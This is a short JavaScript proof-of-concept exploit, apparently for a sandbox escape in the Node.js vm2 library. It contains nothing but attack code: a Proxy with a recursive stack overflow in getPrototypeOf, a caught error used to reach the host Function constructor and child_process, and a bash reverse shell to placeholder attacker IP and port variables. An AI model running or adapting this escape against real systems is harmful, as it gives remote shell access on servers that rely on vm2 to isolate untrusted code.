const {VM} = require("vm2");
const vm = new VM();

const attackerIP = "YOUR.IP.ADDRESS.HERE";
const attackerPort = "YOUR_PORT";

const reverseShellCommand = `bash -c 'bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1'`;

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').exec(
      "${reverseShellCommand}",
      (error, stdout, stderr) => {
        if (error) {
            console.error('Error:', error);
        }
        console.log('stdout:', stdout);
        console.log('stderr:', stderr);
      }
    );
}
`

console.log(vm.run(code));
